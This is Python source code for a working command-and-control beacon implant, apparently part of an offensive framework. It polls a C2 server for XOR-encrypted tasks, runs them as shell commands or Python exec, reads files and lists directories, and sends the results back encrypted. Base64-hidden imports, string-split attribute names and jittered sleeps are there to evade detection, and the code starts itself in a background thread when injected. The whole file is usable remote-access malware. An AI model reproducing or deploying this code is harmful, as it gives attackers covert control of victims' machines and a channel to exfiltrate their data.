def beacon_loop():
    # ==========================================
    # BEACON CONFIGURATION
    # ==========================================
    # These are generic defaults; the framework will dynamically inject 
    # the correct values into the global namespace at runtime.
    C2_URL = globals().get('C2_URL', "http://127.0.0.1:8000")
    XOR_KEY = globals().get('XOR_KEY', "SuperSploitKey")

    TASK_URL = f"{C2_URL}/file"
    RESULT_URL = f"{C2_URL}/rfile"

    # 24 to 48 hours (in seconds)
    # MIN_SLEEP = 86400 # 24 hours
    # MAX_SLEEP = 172800 # 48 hours
    MIN_SLEEP = 30
    MAX_SLEEP = 120


    def _i(b, f=None):
        m = __import__('base64').b64decode(b).decode('utf-8')
        return __import__(m, fromlist=[f] if f else [])

    _o = _i(b'b3M=') # os
    _s = _i(b'c3VicHJvY2Vzcw==') # subprocess
    _sh = _i(b'c2hsZXg=') # shlex
    _io = _i(b'aW8=') # io
    _sy = _i(b'c3lz') # sys
    _gp = _i(b'Z2V0cGFzcw==') # getpass
    _ur = _i(b'dXJsbGliLnJlcXVlc3Q=', 'Request') # urllib.request
    _tm = _i(b'dGltZQ==') # time
    _rd = _i(b'cmFuZG9t') # random

    def _send(data):
        """Encrypts data and POSTs it back to the C2 server."""
        try:
            if isinstance(data, str): data = data.encode('utf-8', errors='ignore')
            # XOR Encrypt and Base64 Encode
            enc = __import__('base64').b64encode(bytes([b ^ ord(XOR_KEY[i % len(XOR_KEY)]) for i, b in enumerate(data)]))
            # Send via HTTP POST
            req = getattr(_ur, 'Request')(RESULT_URL, data=enc, method='POST')
            getattr(_ur, 'urlopen')(req, timeout=10)
        except Exception:
            pass

    def _recv():
        """Fetches the encrypted tasks.txt via HTTP GET and decrypts it."""
        try:
            req = getattr(_ur, 'Request')(TASK_URL)
            with getattr(_ur, 'urlopen')(req, timeout=10) as response:
                enc = response.read().strip()
            
            if not enc: return None
            # Base64 Decode and XOR Decrypt
            dec = __import__('base64').b64decode(enc)
            return bytes([b ^ ord(XOR_KEY[i % len(XOR_KEY)]) for i, b in enumerate(dec)])
        except Exception:
            return None

    shlex_split = getattr(_sh, 'sp' + 'lit')
    os_chdir = getattr(_o, 'ch' + 'dir')
    os_getcwd = getattr(_o, 'get' + 'cwd')
    os_listdir = getattr(_o, 'list' + 'dir')
    os_remove = getattr(_o, 're' + 'move')
    os_path_exists = getattr(getattr(_o, 'pa' + 'th'), 'exi' + 'sts')
    subp_run = getattr(_s, 'ru' + 'n')
    
    while True:
        try:
            # 1. Jitter & Sleep
            # Randomize the sleep interval between 24 and 48 hours to evade heuristic timing analysis
            sleep_duration = getattr(_rd, 'randint')(MIN_SLEEP, MAX_SLEEP)
            getattr(_tm, 'sleep')(sleep_duration)
            data = _recv()
            if not data: 
                continue
            cmd = data.decode('utf-8', errors='ignore').strip()
            if not cmd: continue
            if cmd.lower() == 'exit':
                break
            py_exec = False
            if cmd.startswith('exec('):
                py_exec = True
            elif cmd.endswith('()') and cmd[:-2] in globals():
                py_exec = True
            elif cmd in globals() and callable(globals()[cmd]):
                cmd = cmd + "()"
                py_exec = True

            if py_exec:
                try:
                    old_stdout = _sy.stdout
                    _sy.stdout = getattr(_io, 'StringIO')()
                    exec(compile(cmd, '<string>', 'exec'), globals())
                    output = _sy.stdout.getvalue()
                    _sy.stdout = old_stdout
                    _send(output if output else " \n")
                except Exception as e:
                    try: _sy.stdout = old_stdout
                    except: pass
                    _send(f"[-] Python Error: {e}\n")
                continue

            if cmd.startswith('cd '):
                try: 
                    os_chdir(cmd[3:].strip())
                    _send(b"\n")
                except Exception as e: _send(f"{e}\n")
                continue
                
            elif cmd == 'pwd':
                try: _send(os_getcwd() + "\n")
                except Exception as e: _send(f"{e}\n")
                continue
                
            elif cmd == 'ls' or cmd.startswith('ls '):
                target_dir = cmd[3:].strip() or '.'
                try:
                    files = os_listdir(target_dir)
                    _send('\n'.join(files) + "\n" if files else ' \n')
                except Exception as e: _send(f"{e}\n")
                continue
                
            elif cmd.startswith('cat '):
                try:
                    with open(cmd[4:].strip(), 'r', encoding='utf-8', errors='ignore') as f:
                        out = f.read()
                        _send(out if out else ' \n')
                except Exception as e: _send(f"{e}\n")
                continue

            # --- OS Command Execution ---
            try:
                args = shlex_split(cmd)
                if not args: continue
                
                # Added timeout=30 to ensure the loop doesn't hang on blocking commands
                proc = subp_run(args, shell=False, capture_output=True, text=True, timeout=30)
                out = proc.stdout + proc.stderr
                _send(out if out else " ")
            except Exception as e:
                _send(f"{e}\n")
                
        except Exception:
            # Silent failure ensures the beacon stays alive and tries again next cycle
            pass

def add():
    import threading
    b_thread = threading.Thread(target=beacon_loop, daemon=True)
    b_thread.start()

if __name__ == "__main__" or 'XOR_KEY' in globals():
    add()